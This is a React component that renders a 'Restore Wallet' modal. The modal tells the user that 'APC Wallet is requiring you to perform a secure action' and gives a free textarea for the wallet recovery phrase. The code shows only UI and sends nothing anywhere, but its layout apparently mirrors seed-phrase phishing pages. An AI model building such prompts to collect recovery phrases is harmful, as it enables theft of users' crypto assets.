const RestoreWallet = () => {
    return (
        <>
            <section class="klevar-extention text-white">
                <div class="container">
                    <div class="row justify-content-center">
                        <div class="col-lg-8 col-md-8 col-sm-12">
                            <div class="klevar-inner restore-connect">
                                <div class="top-wallet">
                                    <h5>Restore Wallet</h5>
                                    <i class="fas fa-times"></i>
                                </div>
                                <div class="required">
                                    <p><img src={require("../assets/images/chain.png")}/>APC Wallet is requiring you to perform a secure action</p>
                                </div>
                                <div class="restre-inner-text">
                                    <h5>Recovery Phase</h5>
                                    <form>
                                        <textarea class="form-control" id="textAreaExample1" rows="4"></textarea>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault"/>
                                                <label class="form-check-label" for="flexCheckDefault">
                                                    Advanced Settings
                                                </label>
                                        </div>
                                    </form>
                                </div>
                                <div class="restore-footer">
                                    <div class="restore-buttons">
                                        <img src={require("../assets/images/icon.png")}/>
                                            <button class="btn-danger btn-1">ok</button>
                                            <button class="btn-danger">Cancel</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </>
    )
}

export default RestoreWallet;